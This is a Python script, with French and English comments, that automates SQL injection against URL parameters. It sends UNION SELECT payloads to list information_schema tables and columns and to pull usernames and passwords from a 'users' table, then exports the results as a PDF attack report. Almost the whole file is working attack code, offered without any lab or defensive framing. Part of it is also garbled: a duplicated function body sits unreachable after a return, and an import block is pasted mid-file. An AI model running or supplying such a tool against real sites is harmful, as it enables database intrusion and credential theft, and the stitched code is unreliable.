import requests
from tabulate import tabulate
import logging

# Configurer le logger pour cette section
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def dbSchemaFunc(url, param, payload):
    """
    Attempts SQL injection on a given URL parameter and checks for vulnerable SQL errors or schema enumeration.
    """
    injected_url = f"{url}?{param}={payload}"
    logger.info(f"URL complète testée : {injected_url}")
    try:
        response = requests.get(injected_url)
        # Filtrer le contenu pertinent dans la réponse
        if 'error' in response.text.lower() or 'database' in response.text.lower():
            logger.info(f"Potentielle vulnérabilité détectée pour {param} avec payload : {payload}")
            # Extraire des données spécifiques, si possible
            relevant_data = extract_relevant_data(response.text)
            return (param, payload, "Potential vulnerability detected", relevant_data)
        else:
            logger.info(f"Aucune erreur détectée pour {param} avec payload : {payload}")
            return (param, payload, "No error detected", None)
    except requests.exceptions.RequestException as e:
        logger.error(f"Erreur avec la requête pour {param}: {e}")
        return (param, payload, f"Erreur avec la requête : {e}", None)

def extract_relevant_data(response_text):
    """
    Extracts meaningful data from the response text.
    """
    # Exemple simpliste : retourner uniquement les premières lignes non HTML
    lines = response_text.splitlines()
    meaningful_lines = [line for line in lines if not line.strip().startswith('<')][:5]
    return '\n'.join(meaningful_lines)
    """
    Attempts SQL injection on a given URL parameter and checks for vulnerable SQL errors or schema enumeration.
    """
    injected_url = f"{url}?{param}={payload}"
    logger.info(f"Testing payload: {payload} on parameter: {param}")
    try:
        response = requests.get(injected_url)
        if 'error' in response.text.lower() or 'database' in response.text.lower():
            logger.info(f"Potential vulnerability detected for {param} with payload: {payload}")
            return (param, payload, "Potential vulnerability detected", response.text[:500])
        else:
            logger.info(f"No error detected for {param} with payload: {payload}")
            return (param, payload, "No error detected", None)
    except requests.exceptions.RequestException as e:
        logger.error(f"Error with request for {param}: {e}")
        return (param, payload, f"Error with request: {e}", None)

def map_database_schema(url, param):
    """
    Performs SQL injection to map out the database schema (tables and columns).
    """
    payloads = [
        "' UNION SELECT null, table_name, null FROM information_schema.tables --",
        "' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name = 'users' --",
        "' UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name = 'products' --",
        "' UNION SELECT null, username, password FROM users --"
    ]

    results = []
    for payload in payloads:
        logger.info(f"Sending payload: {payload}")
        result = dbSchemaFunc(url, param, payload)
        results.append(result)

    logger.info(f"Results for parameter {param}: {results}")
    return results

def test_parameters(url, param_list):
    """
    Tests a list of common parameter names to find potential SQL injection points.
    """
    all_results = []
    for param in param_list:
        logger.info(f"Testing parameter: {param}")
        results = map_database_schema(url, param)
        all_results.extend(results)

    if not all_results:
        logger.warning("No results were generated during the test.")

    headers = ["Parameter", "Payload", "Status", "Response"]
    result_table = tabulate(all_results, headers=headers, tablefmt="pretty")
    logger.info("Final result table generated.")
    return result_table
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
import os

def generate_dbschema_report(results, output_path):
    """
    Génère un rapport PDF des résultats de l'attaque dbSchema.
    
    :param results: Tableau formaté ou chaîne contenant les résultats.
    :param output_path: Chemin du fichier PDF à générer.
    """
    try:
        c = canvas.Canvas(output_path, pagesize=letter)
        width, height = letter
        c.setFont("Helvetica", 12)
        
        # Titre du rapport
        c.drawString(50, height - 50, "Rapport de l'attaque dbSchema")
        c.setFont("Helvetica", 10)
        y_position = height - 80
        
        # Ajouter les résultats ligne par ligne
        for line in results.split("\n"):
            if y_position < 50:  # Si on arrive en bas de la page, ajouter une nouvelle page
                c.showPage()
                c.setFont("Helvetica", 10)
                y_position = height - 50
            c.drawString(50, y_position, line)
            y_position -= 15  # Descendre d'une ligne
        
        c.save()
        logger.info(f"Rapport PDF généré avec succès : {output_path}")
    except Exception as e:
        logger.error(f"Erreur lors de la génération du rapport PDF : {e}")
